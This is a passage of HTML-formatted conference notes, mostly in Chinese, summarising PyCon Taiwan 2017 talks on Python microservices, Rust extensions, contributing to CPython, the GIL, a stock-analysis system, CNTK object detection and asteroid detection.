&lt;li&gt;Share your creations  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Building Microservices in Python 個案分享&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: Jonas Cheng  &lt;/li&gt;
&lt;li&gt;Slides: &lt;a href="https://www.slideshare.net/jonascheng3/building-microservices-in-python-pycon2017"&gt;https://www.slideshare.net/jonascheng3/building-microservices-in-python-pycon2017&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Collaborative Note: &lt;a href="https://hackmd.io/OwQwDCBMYEaQtADgJwBYT1WSj7IIwDMh8ApgCYCskyklMyi5qQA=?both#1455-1540-talk-building-microservices-in-python-個案分享"&gt;https://hackmd.io/OwQwDCBMYEaQtADgJwBYT1WSj7IIwDMh8ApgCYCskyklMyi5qQA=?both#1455-1540-talk-building-microservices-in-python-個案分享&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Soocii 是趨勢科技為了弄手機群聊而獨立出來的子公司  &lt;/p&gt;
&lt;p&gt;跨服務間的溝通最好是一個 transaction 就結束，&lt;br /&gt;
如果要額外呼叫其他的服務的話，&lt;br /&gt;
最好採用 async 的方式，&lt;br /&gt;
避免因為時間太長而被 timeout、影響 UX。  &lt;/p&gt;
&lt;h2&gt;Python Module in Rust&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: 許邱翔 (dv)  &lt;/li&gt;
&lt;li&gt;Slides: &lt;a href="https://docs.google.com/presentation/d/1mTw-4buKDTqPNzJS03s2I0apBMal-SaeKk1dHDSE6fk/pub?start=false&amp;amp;loop=false&amp;amp;delayms=3000&amp;amp;slide=id.g22c75fc6c3_0_6"&gt;https://docs.google.com/presentation/d/1mTw-4buKDTqPNzJS03s2I0apBMal-SaeKk1dHDSE6fk/pub?start=false&amp;amp;loop=false&amp;amp;delayms=3000&amp;amp;slide=id.g22c75fc6c3_0_6&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Rust 的生態系  &lt;ul&gt;
&lt;li&gt;特性  &lt;ul&gt;
&lt;li&gt;Memory safety without GC  &lt;/li&gt;
&lt;li&gt;Compiled language  &lt;/li&gt;
&lt;li&gt;Strong, static type  &lt;/li&gt;
&lt;li&gt;效能與 C / C++ 接近  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tools  &lt;ul&gt;
&lt;li&gt;Crates (Like PyPI in Python)  &lt;/li&gt;
&lt;li&gt;Cargo (Like pip + setuptools)  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://doc.crates.io/"&gt;http://doc.crates.io/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;rustup (like pyenv)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.rustup.rs/"&gt;https://www.rustup.rs/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RFCs (like PEP)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rust-lang/rfcs"&gt;https://github.com/rust-lang/rfcs&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How can Python play with binary  &lt;ul&gt;
&lt;li&gt;ctypes  &lt;/li&gt;
&lt;li&gt;CFFI  &lt;ul&gt;
&lt;li&gt;PyPy 團隊的實作  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CPython Extension  &lt;ul&gt;
&lt;li&gt;CPython 官方實作  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How can Python play with Python  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/dgrunwald/rust-cpython"&gt;https://github.com/dgrunwald/rust-cpython&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/PyO3/setuptools-rust"&gt;https://github.com/PyO3/setuptools-rust&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 2 (2017/06/10)&lt;/h1&gt;
&lt;h2&gt;Stochastic Prediction Model, Case of the Dengue outbreak at Tainan, 2015&lt;/h2&gt;
&lt;p&gt;使用 Jupyter Notebook 利用資料分析與視覺化的方式，&lt;br /&gt;
來分析 2015 年台南登革熱爆發的狀況，&lt;br /&gt;
並將這些處理完後的資料拿來建立模型，&lt;br /&gt;
用於之後的預測。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Submit your first CPython patch (and don't worry about C)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: &lt;a href="https://louie.lu"&gt;Louie Lu&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Slides: &lt;a href="https://goo.gl/4oC2Dg"&gt;https://goo.gl/4oC2Dg&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Intro  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Status of CPython Branches  &lt;/li&gt;
&lt;li&gt;History of CPython workflow  &lt;ul&gt;
&lt;li&gt;~2006: SourceForge (repo &amp;amp; issue tracker)  &lt;/li&gt;
&lt;li&gt;2006 ~ 2011: svn.python.org &amp;amp; bugs.python.org  &lt;/li&gt;
&lt;li&gt;2011 ~ 2016: hg.python.org  &lt;/li&gt;
&lt;li&gt;July 2014: PEP-474 by Nick Coghlan (propose moving to Kallithea)  &lt;/li&gt;
&lt;li&gt;Nov 2014: PEP-481  &lt;/li&gt;
&lt;li&gt;Sep 2015: PEP-507  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Basic  &lt;ul&gt;
&lt;li&gt;GitHub  &lt;/li&gt;
&lt;li&gt;Git  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;git remote -v&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CPython Coding Style  &lt;ul&gt;
&lt;li&gt;PEP7  &lt;/li&gt;
&lt;li&gt;PEP8 - CPython C Coding Style  &lt;ul&gt;
&lt;li&gt;比較特殊一點  &lt;/li&gt;
&lt;li&gt;4 spaces, 79 chars per line  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sphinx document style  &lt;ul&gt;
&lt;li&gt;reStructuredText  &lt;ul&gt;
&lt;li&gt;Use 3 spaces, no tabs  &lt;/li&gt;
&lt;li&gt;Hyperlinks  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;Link text &amp;lt;http://example.com/&amp;gt;&lt;/code&gt;_  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Blocks  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;.. note::&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Layout  &lt;ul&gt;
&lt;li&gt;module, stdlib  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;Lib/&amp;lt;module&amp;gt;.py&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;extension-only module  &lt;/li&gt;
&lt;li&gt;builtin types  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;Objects/&amp;lt;builtin&amp;gt;object.c&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;builtin functions  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;Python/bltinmodule.c&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Exception!  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;int&lt;/code&gt; is at &lt;code&gt;Objects/longobject.c&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Contribute  &lt;ul&gt;
&lt;li&gt;How  &lt;ul&gt;
&lt;li&gt;Read, communicate, think  &lt;ul&gt;
&lt;li&gt;devguide  &lt;/li&gt;
&lt;li&gt;mailing lists  &lt;ul&gt;
&lt;li&gt;Python-dev  &lt;/li&gt;
&lt;li&gt;Python-ideas  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://bugs.python.org"&gt;bpo&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;IRC  &lt;ul&gt;
&lt;li&gt;freenode #python-dev  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;lwn.net  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://mail.python.org/pipermail/python-dev/2017-June"&gt;https://mail.python.org/pipermail/python-dev/2017-June&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Where  &lt;ul&gt;
&lt;li&gt;to find a bug?  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://bugs.python.org"&gt;http://bugs.python.org&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;source code  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;XXX&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;TODO&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;mailing list  &lt;/li&gt;
&lt;li&gt;stackoverflow  &lt;/li&gt;
&lt;li&gt;bpo-mergerate:  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://bpo-mergerate.louie.lu"&gt;https://bpo-mergerate.louie.lu&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;what can I do?  &lt;ul&gt;
&lt;li&gt;Writing documentation  &lt;/li&gt;
&lt;li&gt;Helping test patches  &lt;ul&gt;
&lt;li&gt;因為量很多通常核心貢獻者可能要幾個月後才有空測試，所以可以幫忙測試，然後給意見  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Review PR from others  &lt;/li&gt;
&lt;li&gt;Increase test coverage  &lt;/li&gt;
&lt;li&gt;Add comment to exists code  &lt;ul&gt;
&lt;li&gt;可以幫忙把程式碼加上註解，讓其他人比較容易瞭解  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Misc.  &lt;ul&gt;
&lt;li&gt;IDLE  &lt;/li&gt;
&lt;li&gt;devguide issues  &lt;ul&gt;
&lt;li&gt;有很多前人回報的問題，或者自己看到有問題也可以嘗試修改並 submit PR  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;easy issues  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://bugs.python.org/issue?status=1&amp;amp;@sort=-activity&amp;amp;@columns=id,activity,title,creator,status&amp;amp;@dispname=Easy%20issues&amp;amp;@startwith=0&amp;amp;@group=priority&amp;amp;keywords=6&amp;amp;@action=search&amp;amp;@filter=&amp;amp;@pagesize=50"&gt;http://bugs.python.org/issue?status=1&amp;amp;@sort=-activity&amp;amp;@columns=id,activity,title,creator,status&amp;amp;@dispname=Easy%20issues&amp;amp;@startwith=0&amp;amp;@group=priority&amp;amp;keywords=6&amp;amp;@action=search&amp;amp;@filter=&amp;amp;@pagesize=50&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Live contribution  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;from ctypes import *&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Bug 被人搶先修掉了，只好修文件 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;講者表示有興趣的人可以參加第三天的 Unconference，會再更詳細的教學怎麼 contribute code 到 CPython  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Global Interpreter Lock: Episode III - cat &amp;lt; /dev/zero &amp;gt; GIL;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Slide: https://www.slideshare.net/penvirus/global-interpreter-lock-episode-iii-cat-lt-devzero-gil  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Speaker: Tzung-Bi Shih  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;前情提要  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一部曲：&lt;a href="https://www.slideshare.net/penvirus/global-interpreter-lock-episode-i-break-the-seal"&gt;https://www.slideshare.net/penvirus/global-interpreter-lock-episode-i-break-the-seal&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;想瞭解 GIL 的人可以去看這個講者相關的 talk  &lt;ul&gt;
&lt;li&gt;https://www.youtube.com/watch?v=MCs5OvhV9S4  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Introduction  &lt;ul&gt;
&lt;li&gt;GIL prevents us (innocently) from utilizing full power of multiprocessors  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我比較常舉的例子是紅綠燈，一定要綠燈才可以走。如果今天有人不管號誌直接硬走，就有可能發生碰撞，GIL 就像是這樣的一個例子，但討厭的是他是 Global 的，所以很煩人。例如今天這個會場，我現在拿著麥克風在講話，現在後面的朋友想跟他旁邊的人講話，他得大費周章得跑來前面，拿我的麥克風才能講話，這樣大家不會覺得很沒效率嗎？  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;NOTE: &lt;a href="https://blog.louie.lu/2017/05/19/深入-gil-如何寫出快速且-thread-safe-的-python-grok-the-gil-how-to-write-fast-and-thread-safe-python/"&gt;深入 GIL: 如何寫出快速且 thread-safe 的 Python – Grok the GIL: How to write fast and thread-safe Python&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;一句話說清 GIL: 「當有一個執行緒在執行 Python，其他 N 個執行緒都在睡覺或是等待 I/O」  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Motivation  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;大家是不是覺得我到底是多討厭 GIL 導致我要花三集來婊它？並不是的，是我在前公司和同事遇到的問題。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;High performance data processing platform  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;大家可能會認為只有寫 Python 的人才要懂 GIL，但其實 Big Lock 是一個 fundamental 的問題。系統發展在初期的時候常常會使用這樣的 lock。所以研究 GIL 並不是只有 Python 特定而已，其實在研究作業系統的時候都會遇到類似的問題，因為最後大多會把這個大 lock 拆分成不同的小 lock  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/penvirus/gil3/blob/master/1a.c"&gt;1a.c&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Get crashed if we don;t acquire the GIL before using the Python runtime.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/penvirus/gil3/blob/master/1b.c"&gt;1b.c&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Our multithreading program has been serialized into one "effective" thread  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在 Python 的 multithreading 基本上都一定要處理 GIL 的問題，不然只會是「你以為自己有用到但實際上並沒有」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/penvirus/gil3/blob/master/1c.c"&gt;1c.c&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;warning: the example won't compile successfully.  &lt;/li&gt;
&lt;li&gt;嘗試修改，但兩個多小時之後沒成功就放棄了，改用其他方法  &lt;/li&gt;
&lt;li&gt;Dynamic linker 可能有幫助，朝著讓兩個 task 使用不同的 Python interpreter 的方向去解決  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/penvirus/gil3/blob/master/2a.c"&gt;2a.c&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/penvirus/gil3/blob/master/2b.c"&gt;2b.c&lt;/a&gt;, &lt;a href="https://github.com/penvirus/gil3/blob/master/2c.c"&gt;2c.c&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;成功了，但結束後得把 .so 檔刪掉。  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;這方法我給 87 分，因為太北七了，找到了 dlmopen 的文件，三天三夜跪在電腦前不能自我，醒來的時候已經是第四天早上  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/penvirus/gil3/blob/master/3a.c"&gt;3a.c&lt;/a&gt;, &lt;a href="https://github.com/penvirus/gil3/blob/master/3b.c"&gt;3b.c&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;後續使用 dlmopen 把 global 變數拆成兩份，確實是可以做到。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/penvirus/gil3/blob/master/4a.c"&gt;4a.c&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;但把 dlmopen 和 Python 放在一起就是會出事，像是這個例子。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;More Complicated Example  &lt;ul&gt;
&lt;li&gt;6b.c  &lt;ul&gt;
&lt;li&gt;configuration task  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Discussion  &lt;ul&gt;
&lt;li&gt;some 3rd-party libraries may not work well  &lt;ul&gt;
&lt;li&gt;they have been guaranteed to be the only active instance  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;64-bits address space is big enough; is put them altogether a good idea?  &lt;ul&gt;
&lt;li&gt;Similar debates on monolithic and microkernel  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;反正我今天就是來胡說八道的，我可以大膽預測，3~5年內一定會出現相關的第三方應用，可能會完全捨棄安全性而只著重在效能的方面  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;About removing GIL, reference Larry Hastings The Gilectomy: https://www.youtube.com/watch?v=pLqv11ScGsQ  &lt;/p&gt;
&lt;h2&gt;土炮股票分析系統&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Spearker: Victor Gau  &lt;/li&gt;
&lt;li&gt;Slides: &lt;a href="https://goo.gl/JVLhRh"&gt;https://goo.gl/JVLhRh&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;GitHub Repo: &lt;a href="https://github.com/victorgau/PyConTW2017"&gt;https://github.com/victorgau/PyConTW2017&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;講者使用 Jupyter Notebook 一步步教學，&lt;br /&gt;
講解如何用 Python 去抓取和分析股票資訊，&lt;br /&gt;
使用到 Pandas, Quandl, Numpy, ffn 等 modules，&lt;br /&gt;
並透過 Jupyter Notebook 做簡單的視覺化。&lt;br /&gt;
還加上了一些基本的投資教學，&lt;br /&gt;
並在開頭的時候講了一些股票投資的小故事。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;投資是藝術還是科學？  &lt;ul&gt;
&lt;li&gt;與生俱來或可被訓練？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.books.com.tw/products/0010384228"&gt;華爾街傳奇：海龜投資法則&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;William Eckhardt vs Richard Dennis  &lt;ul&gt;
&lt;li&gt;William 相信是與生俱來的  &lt;/li&gt;
&lt;li&gt;Richard 則相信是可被訓練的  &lt;ul&gt;
&lt;li&gt;用好幾台 DOS 去跑分析  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;投資 3M's  &lt;ul&gt;
&lt;li&gt;Mind: 投資心理  &lt;/li&gt;
&lt;li&gt;Money: 資金管理  &lt;ul&gt;
&lt;li&gt;Equal weight  &lt;/li&gt;
&lt;li&gt;停損、停利  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Method: 方法、系統  &lt;ul&gt;
&lt;li&gt;今天會談到的部份  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;架構圖  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;          +-------&amp;gt; 股價資料 -----------------+  
          |   |                               |  
抓資料 ---+---+---&amp;gt; 財報資料 ---&amp;gt; 選股策略 ---+---&amp;gt; 進出場策略 ---&amp;gt; 部位規模  
          |   |                      |        |          |             ^  
          +---+---&amp;gt; 公司資料         ˇ        |          ˇ             |  
                                  候選股票 ---+       投資標的 --------+  
                                     ^  
                                     |  
                                   自選股  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;抓資料  &lt;ul&gt;
&lt;li&gt;google 一下關鍵字  &lt;ul&gt;
&lt;li&gt;e.g. "Nasdaq company list"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用 Pandas  &lt;/li&gt;
&lt;li&gt;使用 &lt;a href="https://www.quandl.com/"&gt;Quandl&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;讀歷史股價  &lt;ul&gt;
&lt;li&gt;用 Quandl 使用 "Yahoo/TW_${股票代號}"  &lt;/li&gt;
&lt;li&gt;要用調整過後的股價去算，不然會有問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;選股策略  &lt;ul&gt;
&lt;li&gt;計算每天股價的變化  &lt;/li&gt;
&lt;li&gt;計算波動率  &lt;ul&gt;
&lt;li&gt;Standard deviation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;進出場策略  &lt;ul&gt;
&lt;li&gt;自己決定  &lt;/li&gt;
&lt;li&gt;Sharpe Ratio  &lt;ul&gt;
&lt;li&gt;不希望大起大落  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Maximum Drawdown  &lt;ul&gt;
&lt;li&gt;不希望賺錢了之後結果兩個月都沒賺  &lt;/li&gt;
&lt;li&gt;Maximum Drawdown 短一點就比較不會大起大落  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;f.fn()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DEMO  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/victorgau/PyConTW2017"&gt;https://github.com/victorgau/PyConTW2017&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Deep Learning Based Object Detection (Fast R-CNN) in the Microsoft Cognitive Toolkit&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: Herman Wu  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;link: https://tw.pycon.org/2017/en-us/events/talk/348099433595928706/  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Cognitive 特性  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python and C++ API  &lt;ul&gt;
&lt;li&gt;大部份用 C++ 實作  &lt;/li&gt;
&lt;li&gt;Low level + high level Python API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Extensibility  &lt;ul&gt;
&lt;li&gt;User functions and learners in pure Python  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Readers  &lt;ul&gt;
&lt;li&gt;Distributed highly...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deep Learning Revolutionized Image Recognition  &lt;ul&gt;
&lt;li&gt;Largetst image datatset - ImageNET  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;COCO Segmentation Challenge 2016  &lt;ul&gt;
&lt;li&gt;MSRA won 1st place back-to-back  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Semantic Segmentation  &lt;ul&gt;
&lt;li&gt;Recognizing pixels  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;First CNTK Example  &lt;ul&gt;
&lt;li&gt;CNTK Model  &lt;/li&gt;
&lt;li&gt;MNIST Handwritten Digits (OCR)  &lt;/li&gt;
&lt;li&gt;Multi-layer perceptron  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Microsoft/CNTK/tree/master/Tutorials"&gt;https://github.com/Microsoft/CNTK/tree/master/Tutorials&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;RELU  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 3 (2017/06/11)&lt;/h1&gt;
&lt;h2&gt;&lt;a href="https://github.com/pycontw/unconference"&gt;Unconference&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;用Python拯救地球： 如何找出危險的太陽系天體？&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;JPL Horizon  &lt;ul&gt;
&lt;li&gt;可以看到小行星的軌跡  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;日本的「昴」望遠鏡  &lt;ul&gt;
&lt;li&gt;兩公尺高  &lt;/li&gt;
&lt;li&gt;CCD 由一百多片 CCD 組成  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;真實看到的天文照片不是彩色的  &lt;/li&gt;
&lt;li&gt;要找出什麼？  &lt;ul&gt;
&lt;li&gt;近地小行星  &lt;/li&gt;
&lt;li&gt;小行星  &lt;/li&gt;
&lt;li&gt;古柏帶天體  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;主要應用工具  &lt;ul&gt;
&lt;li&gt;Python  &lt;/li&gt;
&lt;li&gt;scipy - KDTree, array  &lt;/li&gt;
&lt;li&gt;sklearn - RandomForestClassifier (supervised and unsupervised)  &lt;/li&gt;
&lt;li&gt;astropy, pyfits, pyephem, matplotlib, multiprocessing, sqlite3  &lt;/li&gt;
&lt;li&gt;C, C++, MPI, mysql  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Super Big Data  &lt;ul&gt;
&lt;li&gt;一天將近 0.5 TB 的 raw data  &lt;/li&gt;
&lt;li&gt;包含許多恆星、星系、垃圾  &lt;ul&gt;
&lt;li&gt;一次曝光資料處理完約有數十萬至數百萬筆資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Machine Learning  &lt;ul&gt;
&lt;li&gt;利用資料庫裡的各種測量參數 (55個） 來判斷每一筆資料是否為真  &lt;/li&gt;
&lt;li&gt;ML 的應用，比起傳統上的條件篩選有效的多，也被用來測量星系之間的距離（紅移）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;現況  &lt;ul&gt;
&lt;li&gt;目前有 15,621 個近地小行星被找到 (大小 1 公尺 ~ 32 公里)，目前都沒有危險  &lt;/li&gt;
&lt;li&gt;理論模型推論有將近 100 萬個 &amp;gt; 140 公尺的近地小行星（所以我們才找到約 1%）  &lt;/li&gt;
&lt;li&gt;現在正在執行的計劃：LINEAR, NEAT, CSS, NEOWISE, Pan-STARRS, ALTAS  &lt;/li&gt;
&lt;li&gt;目前許多大型國際合作計劃都以 Python 為主要的程式語言，並結合 Cython 或 call 外部 script 以提升分析速度，例如：  &lt;ul&gt;
&lt;li&gt;ALMA - CASA  &lt;/li&gt;
&lt;li&gt;LSST  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
